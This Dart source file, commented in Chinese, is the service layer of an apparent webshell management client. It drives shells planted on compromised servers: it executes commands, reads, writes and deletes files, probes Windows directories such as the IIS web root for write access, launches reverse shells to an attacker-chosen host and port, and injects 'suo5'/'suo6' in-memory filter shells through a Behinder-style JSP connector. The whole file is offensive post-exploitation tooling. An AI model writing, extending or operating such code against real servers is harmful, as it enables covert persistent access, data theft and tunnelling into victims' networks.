export '../models/file_entry.dart';

import 'dart:typed_data';

import '../connectors/connector_factory.dart';
import '../connectors/jsp_behinder_connector.dart';
import '../connectors/shell_connector.dart';
import '../models/file_entry.dart';
import '../models/webshell.dart';

/// Webshell 通信 Facade
///
/// 根据 [Webshell.connectorType] 自动选择对应的 [ShellConnector] 实现。
/// 上层 UI 只与 WebshellService 交互，无需感知具体连接器。
class WebshellService {
  final Webshell webshell;
  late final ShellConnector _connector;

  WebshellService(this.webshell)
      : _connector = ConnectorFactory.create(webshell);

  // 暴露连接器能力，供 UI 判断是否显示某些功能
  Set<ConnectorCapability> get capabilities => _connector.capabilities;
  bool get supportsShellExec => _connector.supportsShellExec;
  bool get supportsFileRead  => _connector.supportsFileRead;
  bool get supportsFileWrite => _connector.supportsFileWrite;
  bool get isProbeOnly       => _connector.isProbeOnly;
  bool get isWindowsTarget => webshell.connectorType.startsWith('asp');

  String get currentDir => _connector.currentDir;
  set currentDir(String v) => _connector.currentDir = v;

  // ── 代理方法 ──────────────────────────────────────────────────────────────

  Future<bool> ping() => _connector.ping();

  String? get lastPingDiagnostic => _connector.lastPingDiagnostic;

  Future<String> executeCommand(String cmd, {String workingDir = ''}) =>
      _connector.executeCommand(cmd, workingDir: workingDir);

  Future<String> getCurrentDir() => _connector.getCurrentDir();

  Future<List<FileEntry>> listDirectory(String path) =>
      _connector.listDirectory(path);

  Future<String> readFile(String path) => _connector.readFile(path);

  Future<bool> writeFile(String path, String content) =>
      _connector.writeFile(path, content);

  Future<bool> deleteFile(String path) => _connector.deleteFile(path);

  Future<Uint8List> readFileBinary(String path) =>
      _connector.readFileBinary(path);

  Future<bool> writeFileBinary(String path, Uint8List bytes) =>
      _connector.writeFileBinary(path, bytes);

  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) => _connector.writeFileBinaryWithProgress(path, bytes, onProgress);

  Future<Map<String, String>> getSystemInfo() => _connector.getSystemInfo();

  Future<List<({String name, bool isDir})>> listNamesForCompletion(
          String path) =>
      _connector.listNamesForCompletion(path);

  Future<String> getHomeDir() => _connector.getHomeDir();

  /// Windows 目标：检测哪些目录有写权限，返回可写路径列表。
  Future<List<String>> detectWritableDirs() async {
    if (!isWindowsTarget) return [];
    const candidates = [
      r'C:\Windows\Temp',
      r'C:\inetpub\wwwroot',
      r'C:\inetpub\temp',
      r'C:\inetpub\logs',
      r'C:\Users\Public',
      r'C:\Windows\System32\spool\drivers\color',
    ];
    final writable = <String>[];
    for (final dir in candidates) {
      final probe = r'__mx_probe.tmp';
      final full = '$dir\\$probe';
      final r = await _connector.executeCommand(
        'echo 1 > "$full" && del "$full" && echo OK',
      );
      if (r.trim().contains('OK')) writable.add(dir);
    }
    // 当前文件管理目录也检测一下
    final cur = _connector.currentDir;
    if (!candidates.contains(cur)) {
      final full = '$cur\\__mx_probe.tmp';
      final r = await _connector.executeCommand(
        'echo 1 > "$full" && del "$full" && echo OK',
      );
      if (r.trim().contains('OK')) writable.add(cur);
    }
    return writable;
  }

  Future<List<String>> listEnvVarNames() => _connector.listEnvVarNames();

  /// 尝试通过当前连接器在目标上启动反弹 Shell。
  ///
  /// 默认依赖 [ShellConnector.startReverseShell] 的实现：
  /// - 仅当连接器具备 [ConnectorCapability.shellExec] 时可用。
  /// - 默认生成类 Unix 反弹命令，具体连接器可自行重写以支持更多平台。
  Future<void> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) =>
      _connector.startReverseShell(lhost, lport, preferScript: preferScript);

  /// 当前连接器是否支持注入内存马（仅 jsp_behinder 支持）。
  bool get canInjectSuo5 => _connector is JspBehinderConnector;
  bool get canInjectSuo6 => _connector is JspBehinderConnector;

  /// 向目标注入 suo5 Filter 内存马。
  Future<String> injectSuo5MemShell({
    String filterName = 's5_mem',
    String urlPath = '/*',
  }) async {
    final c = _connector;
    if (c is! JspBehinderConnector) return '[Error] 当前连接器不支持 suo5 注入';
    return c.injectSuo5MemShell(filterName: filterName, urlPath: urlPath);
  }

  /// 向目标注入 suo6 Filter 内存马（二进制多路复用隧道）。
  Future<String> injectSuo6MemShell({
    String filterName = 'suo6',
    String urlPath = '/s6',
  }) async {
    final c = _connector;
    if (c is! JspBehinderConnector) return '[Error] 当前连接器不支持 suo6 注入';
    return c.injectSuo6MemShell(filterName: filterName, urlPath: urlPath);
  }
}
